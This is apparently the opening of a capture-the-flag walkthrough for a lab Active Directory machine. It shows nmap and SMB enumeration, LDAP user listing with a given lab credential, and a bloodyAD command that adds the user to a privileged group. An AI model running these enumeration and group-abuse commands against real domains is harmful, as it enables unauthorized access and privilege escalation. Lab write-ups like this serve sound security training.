```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -O -Pn 10.10.11.70 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-23 04:33 EDT
Nmap scan report for PUPPY.HTB (10.10.11.70)
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-23 15:34:43Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-23T15:36:44
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.73 seconds
```
## SMB

```bash
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.11.70 -U levi.james
Password for [WORKGROUP\levi.james]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      DEV-SHARE for PUPPY-DEVS
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.70 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## Users Enumeration
ldapsearch -x -H ldap://10.10.11.70 -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -b "DC=PUPPY,DC=HTB" "(objectClass=user)" sAMAccountName memberOf
# extended LDIF
#
# LDAPv3
# base <DC=PUPPY,DC=HTB> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName memberOf 
#

# Administrator, Users, PUPPY.HTB
dn: CN=Administrator,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Domain Admins,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Enterprise Admins,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Schema Admins,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
sAMAccountName: Administrator

# Guest, Users, PUPPY.HTB
dn: CN=Guest,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Guests,CN=Builtin,DC=PUPPY,DC=HTB
sAMAccountName: Guest

# DC, Domain Controllers, PUPPY.HTB
dn: CN=DC,OU=Domain Controllers,DC=PUPPY,DC=HTB
sAMAccountName: DC$

# krbtgt, Users, PUPPY.HTB
dn: CN=krbtgt,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=PUPPY,DC=HTB
sAMAccountName: krbtgt

# Levi B. James, MANPOWER, PUPPY.HTB
dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
memberOf: CN=HR,DC=PUPPY,DC=HTB
sAMAccountName: levi.james

# Anthony J. Edwards, PUPPY.HTB
dn: CN=Anthony J. Edwards,DC=PUPPY,DC=HTB
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
memberOf: CN=SENIOR DEVS,CN=Builtin,DC=PUPPY,DC=HTB
sAMAccountName: ant.edwards

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
memberOf: CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
sAMAccountName: adam.silver

# Jamie S. Williams, Users, PUPPY.HTB
dn: CN=Jamie S. Williams,CN=Users,DC=PUPPY,DC=HTB
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
sAMAccountName: jamie.williams

# Stephen W. Cooper, PUPPY ADMINS, PUPPY.HTB
dn: CN=Stephen W. Cooper,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
memberOf: CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
sAMAccountName: steph.cooper

# Stephen A. Cooper_adm, PUPPY ADMINS, PUPPY.HTB
dn: CN=Stephen A. Cooper_adm,OU=PUPPY ADMINS,DC=PUPPY,DC=HTB
memberOf: CN=Administrators,CN=Builtin,DC=PUPPY,DC=HTB
sAMAccountName: steph.cooper_adm

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 14
# numEntries: 10
# numReferences: 3

┌──(kali㉿kali)-[~]
└─$ bloodyAD --host '10.10.11.70' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2025!' add groupMember DEVELOPERS levi.james 
[+] levi.james added to DEVELOPERS
                                                                                                          
┌──(kali㉿kali)-[~]
